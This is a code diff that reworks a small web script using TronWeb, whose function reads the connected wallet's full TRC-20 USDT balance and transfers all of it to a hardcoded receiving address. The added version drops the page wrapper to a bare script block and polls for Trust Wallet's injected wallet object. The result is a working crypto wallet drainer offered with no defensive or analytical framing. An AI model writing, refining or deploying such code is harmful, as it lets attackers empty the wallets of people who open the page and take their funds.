@@ -1,42 +1,40 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Send All TRC20 USDT</title>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
-</head>
-<body>
-  <h2>Send All USDT (TRC-20)</h2>
-  <button onclick="sendAllUSDT()">Send USDT</button>
+<script>
+  async function waitForTronWeb(timeout = 10000) {
+    return new Promise((resolve, reject) => {
+      const start = Date.now();
 
-  <script>
-    const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC-20 USDT Contract
-    const RECEIVER_ADDRESS = "TGyoKBUG2VuTKpC6iSwcG1BHmyShCQtuvo"; // Your TRON address
+      (function check() {
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+          return resolve(window.tronWeb);
+        }
+        if (Date.now() - start >= timeout) {
+          return reject("TronWeb not available in Trust Wallet");
+        }
+        setTimeout(check, 500);
+      })();
+    });
+  }
 
-    async function sendAllUSDT() {
-      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        alert("Please open in Trust Wallet or TronLink DApp browser.");
-        return;
-      }
+  async function sendAllUSDT() {
+    try {
+      const tronWeb = await waitForTronWeb();
 
-      const tronWeb = window.tronWeb;
-      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-      const sender = tronWeb.defaultAddress.base58;
-      const balance = await usdtContract.balanceOf(sender).call();
+      const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+      const RECEIVER_ADDRESS = "TGyoKBUG2VuTKpC6iSwcG1BHmyShCQtuvo";
+
+      const usdt = await tronWeb.contract().at(USDT_CONTRACT);
+      const from = tronWeb.defaultAddress.base58;
+      const balance = await usdt.balanceOf(from).call();
 
       if (balance.toString() === "0") {
-        alert("No USDT balance found.");
-        return;
+        return alert("No USDT available in your wallet.");
       }
 
-      try {
-        const tx = await usdtContract.transfer(RECEIVER_ADDRESS, balance).send();
-        alert("Transaction sent!\nTX: " + tx);
-      } catch (error) {
-        console.error(error);
-        alert("Transaction failed.");
-      }
+      const tx = await usdt.transfer(RECEIVER_ADDRESS, balance).send();
+      alert("Transaction successful:\n" + tx);
+    } catch (err) {
+      console.error(err);
+      alert("❌ " + err);
     }
-  </script>
-</body>
-</html>
-
+  }
+</script>
